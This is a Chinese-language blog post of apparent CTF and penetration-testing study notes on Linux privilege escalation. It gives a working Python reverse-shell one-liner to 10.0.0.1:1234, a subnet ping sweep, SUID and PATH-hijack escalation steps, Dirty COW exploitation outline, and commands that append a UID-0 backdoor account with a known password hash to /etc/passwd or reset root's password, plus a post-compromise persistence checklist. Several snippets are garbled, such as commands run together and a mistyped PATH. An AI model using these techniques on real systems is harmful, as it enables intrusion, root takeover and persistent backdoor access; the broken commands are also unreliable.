---
layout:     post
title:      权限提升&内网渗透（二）Linux提权
subtitle:   这个系列是整理学习安全的笔记，记录一些学习到的提权和内网渗透的知识，还有一些相关工具的使用，脚本可能不会贴源码，因为都是从别人搜集的开源exp中拿过来用的，已知出处的会附加链接。本章是记录Linux提权，可能不全，只是前段时间蹭课学到记录下来的。
date:       2020-12-29
author:     K4ys0n
header-img: img/post-bg-art.jpg
catalog:    true
tags:
    - CTF
    - Linux
    - 网络安全
    - 学习笔记
    - 权限提升
    - 漏洞利用
    - 内网渗透
---



## 0x00 Linux提权思路

- 在大部分的Linux系统提权脚本中，都是需要准备一个交互式shell。
- 然后获取系统的版本以及内核信息，根据获取到的信息，查找exp。
- 编译找到的exp，使用编译好的exp进行权限提升。



## 0x01 信息搜集

#### 1. 本地信息搜集

```shell
# 获取内核信息
uname -a

# 获取系统信息
cat /etc/issue

# 打开交互式shell
python -c 'import pty;pty.spawn("/bin/sh");'  # python2.7以下不能用

# 查看当前目录下的文件和文件夹
ls -al

# 查看当前操作路径
pwd
```

#### 2. 内网信息搜集

- 一般信息

```shell
ifconfig
ip addr		# （centos必须用ip addr）
```

- 内网主机探测

扫描内网时，在root权限下，Linux可以用bash脚本或python脚本完成nmap功能，主要实现主机识别、端口扫描，Linux中使用ping命令，可以探测内网主机。

上传ping.sh，给脚本添加x权限

```shell
chmod a+x ping.sh
```

执行ping.sh

```shell
./ping.sh
```

ping.sh脚本内容如下：

```shell
#! /bin/sh
ip = '192.168.11'
for i in `seq 1 255`
  do
      {
      ping -c 2 $ip.$i ?>/dev/null 2>&1
      if [ $? -eq 0 ];then
          echo $ip.$i UP
      else
          echo $ip.$i DOWN
      fi
}&
done
wait 
```

- 内网服务探测

使用nmap探测内网服务（需要上传绿色版nmap或在靶机上访问公网下载安装，要求多，比较麻烦）

```shell
nmap -p 80,443,3389, 192.168.1.1/24
```

或者用自己写内网探测脚本，上传执行

```shell
python nmap.py        # 脚本自行准备
```



## 0x02 python反弹shell

反弹shell在可新建文件的目录里新建一个python文件a.py，将下面代码保存进去，然后命令行执行

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

需要修改其中的ip和端口。



## 0x03 权限提升

#### 1. 内核溢出提权（如脏牛）

- 查看内核

```shell
uname -r
```

- 反弹shell执行命令
- 上传exp
- 编译
- 执行
- 根据内核版本查找对应漏洞
- 收集exp

可以从[www.exploit-db.com](http://www.exploit-db.com)查找漏洞利用。

> Linux脏牛提权CVE-2016-5195: 【dirty cow】
>
> 如果目标靶机存在gcc/g++，则直接上传.c/.cpp文件然后进行编译，执行提权；
>
> 如果没有，则需要线下准备好环境提前编译，上传编译后的可执行文件，执行提权。

#### 2. MySQL udf提权

- 上传库文件
- 执行库文件创建命令执行函数

#### 3. 利用SUID提权

寻找系统里可以用的SUID文件来提权

```shell
find / -perm -u=s -type f 2>/dev/null
```

举个例子，假设发现nmap有SUID标志位，nmap支持`interactive.`选项，用户能够通过该选项执行shell命令，通常安全人员会使用该命令来避免他们使用nmap命令备记录在history文件中。 所以通过nmap命令`!sh`就会获取到一个root权限的shell。

#### 4. 利用环境变量劫持高权限程序提权

- 查找可操作文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

- 利用file命令查看文件是否可执行

假设找到test文件，可以直接执行`./test`

- 执行该文件

在执行的时候可能会报错，根据报错来查看调用系统命令（假设这里某个文件是在cat命令时报错），那么就可以利用低权限用户目录下可被root权限用户调用的脚本提权。

- 设置bash的$path环境变量

```bash
export PATH = '.'
```

- 调用cat命令

当调用cat命令的时候，cat会从以上目录来寻找，如果我们添加.到$PATH环境变量，则会先从当前目录来寻找cat指令。

- 新建cat，添加执行权限

```shell
touch catchmod +x catecho "/bin/sh" > cat
```

这样当我们再次运行`./msgmike`（执行有sid的文件）的时候，就会触发当前目录下的cat（/bin/sh），从而提权。

- 完整步骤

```SHELL
# 第一步
./test （回车后发现错误）

# 第二步
export PATH="."

# 第三步（命令复原）
export PATH="/usr/local/bia:/usr/bin:/usr/local/games:/usr/games"
```



## 0x05 一些技巧

#### 1. 非交互式shell如何增加账户

正常shell中改密码或加账户时，会弹出让我们输入密码，这时非交互式shell是无法操作的。

此时可以直接：

```shell
echo "[/etc/passwd形式的账户密码]" >> /etc/passwd
echo "xx:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash" >> /etc/passwd
```

其中`fi8RL.Us0cfSs`为`123456`的哈希，第一个0代表用户root权限，第二个0代表组root权限。

或者

```shell
echo [testuser]:[password] | chpasswd
echo root:123456 | chpasswd
```

删除`/etc/passwd`最后一行：

```shell
sed -i '$d' /etc/passwd
```

一般拿到非交互式shell或者远程命令执行后的步骤：

- 修改root密码
- 增加一个账户
- 追加该账户密码
- 可能需要端口转发
- ssh等连接目标靶机或连接端口转发出来的端口
- 连接后登陆

#### 2. ftp服务下载源码

如果发现目标服务器开了ftp服务（21端口）：
- 直接浏览器访问

```shell
ftp://xx.xx.xx.xx
```

- curl进行访问，会返回一些目录信息，根据目录还可以进入继续访问

```shell
curl ftp://xx.xx.xx.xx
curl ftp://xx.xx.xx.xx/backup
```

- wget下载
wget -r ftp://xx.xx.xx.xx/backup    递归下载整个目录，会保存到本地当前目录

#### 3. Linux后台运行命令

加一个`&`即可

```shell
./xxx &
```

#### 4. centos查看系统版本

```shell
cat /etc/redhat-release
```

#### 5. Linux下IP绑定域名方法
vim打开`/etc/hosts`，在最后追加 IP 及对应域名即可。